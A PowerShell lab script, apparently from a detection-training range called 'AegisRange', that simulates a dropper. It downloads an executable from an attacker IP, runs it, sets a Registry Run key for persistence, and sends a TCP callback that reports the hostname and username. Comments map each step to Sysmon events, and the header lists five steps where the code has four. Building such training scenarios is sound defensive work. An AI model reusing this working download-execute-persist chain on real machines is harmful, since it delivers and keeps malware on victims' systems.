# =============================================================================
# AegisRange — Scenario 2: Simulated Malware Dropper (PowerShell)
# =============================================================================
# EDUCATIONAL USE ONLY — Run exclusively in the AegisRange isolated lab.
#
# This script simulates a multi-stage attack chain for detection training:
#   Step 1: Download a file from the attacker's HTTP server
#   Step 2: Write it to a commonly-abused directory
#   Step 3: Execute the downloaded file
#   Step 4: Establish persistence via Registry Run key
#   Step 5: Perform an outbound callback to the attacker
#
# The "payload" is a BENIGN compiled binary that prints a message and exits.
# No actual malicious functionality is included.
#
# Prerequisites:
#   - Run on aegis-windows (10.10.10.30)
#   - aegis-kali (10.10.10.10) must be running HTTP server on port 8080
#   - aegis-kali must be running netcat listener on port 4444
# =============================================================================

param(
    [string]$AttackerIP   = "10.10.10.10",
    [int]$HttpPort        = 8080,
    [int]$CallbackPort    = 4444
)

# --- Configuration ---
$PayloadUrl      = "http://${AttackerIP}:${HttpPort}/payload.exe"
$PayloadPath     = "C:\Users\Public\payload.exe"
$PersistenceName = "AegisRangeTest"
$LogDir          = "C:\AegisRange\logs\scenario2"

# --- Setup ---
New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
$LogFile = Join-Path $LogDir "dropper_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Write-Log {
    param([string]$Message)
    $entry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Write-Host $entry
    Add-Content -Path $LogFile -Value $entry
}

Write-Log "============================================"
Write-Log "  AegisRange — Scenario 2: Simulated Dropper"
Write-Log "  Attacker : ${AttackerIP}"
Write-Log "  Target   : $(hostname)"
Write-Log "============================================"

# =============================================================================
# Step 1: Download payload from attacker HTTP server
# =============================================================================
Write-Log "[*] Step 1: Downloading file from $PayloadUrl ..."
try {
    # This generates: Sysmon EID 3 (network connection) + EID 11 (file create)
    Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath -UseBasicParsing
    Write-Log "[+] File downloaded to $PayloadPath"
} catch {
    Write-Log "[-] Download failed: $_"
    Write-Log "[-] Ensure the HTTP server is running on Kali: python3 -m http.server $HttpPort"
    exit 1
}

Start-Sleep -Seconds 2

# =============================================================================
# Step 2: Execute the downloaded file
# =============================================================================
Write-Log "[*] Step 2: Executing downloaded file..."
try {
    # This generates: Sysmon EID 1 (process creation) with ParentImage = powershell.exe
    $proc = Start-Process -FilePath $PayloadPath -Wait -PassThru
    Write-Log "[+] Process exited with code: $($proc.ExitCode)"
} catch {
    Write-Log "[-] Execution failed: $_"
}

Start-Sleep -Seconds 2

# =============================================================================
# Step 3: Establish persistence via Registry Run key
# =============================================================================
Write-Log "[*] Step 3: Setting Registry Run key for persistence..."
try {
    # This generates: Sysmon EID 13 (registry value set)
    Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
                     -Name $PersistenceName `
                     -Value $PayloadPath
    Write-Log "[+] Persistence set: HKCU\...\Run\$PersistenceName = $PayloadPath"
} catch {
    Write-Log "[-] Failed to set persistence: $_"
}

Start-Sleep -Seconds 2

# =============================================================================
# Step 4: Outbound callback to attacker
# =============================================================================
Write-Log "[*] Step 4: Performing outbound callback to ${AttackerIP}:${CallbackPort}..."
try {
    # This generates: Sysmon EID 3 (network connection to attacker)
    $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $CallbackPort)
    $stream = $client.GetStream()
    $message = "AegisRange callback from $(hostname) at $(Get-Date) — user: $env:USERNAME`n"
    $data = [System.Text.Encoding]::ASCII.GetBytes($message)
    $stream.Write($data, 0, $data.Length)
    $stream.Close()
    $client.Close()
    Write-Log "[+] Callback successful"
} catch {
    Write-Log "[-] Callback failed (expected if no listener): $_"
}

# =============================================================================
# Summary
# =============================================================================
Write-Log ""
Write-Log "============================================"
Write-Log "  Scenario 2 Complete!"
Write-Log "============================================"
Write-Log ""
Write-Log "  Evidence to check:"
Write-Log "    Sysmon Event Log : Process creation, network, file, registry events"
Write-Log "    PowerShell Log   : Microsoft-Windows-PowerShell/Operational"
Write-Log "    Security Log     : Process creation audit events"
Write-Log "    Log file         : $LogFile"
Write-Log ""
Write-Log "  To view Sysmon events:"
Write-Log '    Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50'
Write-Log ""
